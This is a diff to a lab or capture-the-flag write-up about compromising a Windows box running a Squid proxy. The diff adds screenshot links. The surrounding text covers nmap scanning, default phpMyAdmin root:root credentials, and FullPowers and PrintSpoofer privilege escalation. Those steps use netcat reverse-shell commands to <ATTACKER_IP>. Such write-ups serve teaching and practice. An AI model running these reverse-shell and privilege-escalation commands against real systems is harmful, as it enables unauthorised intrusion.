@@ -29,6 +29,8 @@ PrintSpoofer can finish the job.
 sudo nmap -p- -sCV <TARGET_IP>
 ```
 
+![nmap service scan](./assets/squid/01-nmap.png)
+
 Port 3128 served a Squid proxy error page — the box's only externally
 obvious purpose. Rather than treating that as a dead end, a proxy-aware port
 scanner (`spose`) was used to enumerate ports reachable *through* the
@@ -40,7 +42,11 @@ proxy rather than directly, which surfaced additional open ports (3306,
 ## Foothold / Initial Access
 
 Configuring the discovered proxy in Burp/FoxyProxy for port 8080 revealed a
-**phpMyAdmin** login behind it. `root:root` — the well-known phpMyAdmin
+**phpMyAdmin** login behind it.
+
+![phpMyAdmin reachable through the proxy](./assets/squid/02-phpmyadmin-root.png)
+
+`root:root` — the well-known phpMyAdmin
 default — worked immediately.
 
 A documented phpMyAdmin-to-shell technique (writing a PHP payload through
@@ -86,6 +92,8 @@ FullPowers.exe -c "C:\Temp\nc64.exe <ATTACKER_IP> 443 -e cmd.exe"
 # Stage 2 — from that new shell, run PrintSpoofer:
 PrintSpoofer64.exe -c "C:\Temp\nc64.exe <ATTACKER_IP> 4444 -e cmd.exe"
 ```
+
+![FullPowers restoring SeImpersonatePrivilege](./assets/squid/03-fullpowers.png)
 
 SYSTEM shell caught on the second listener. Root flag retrieved.
 
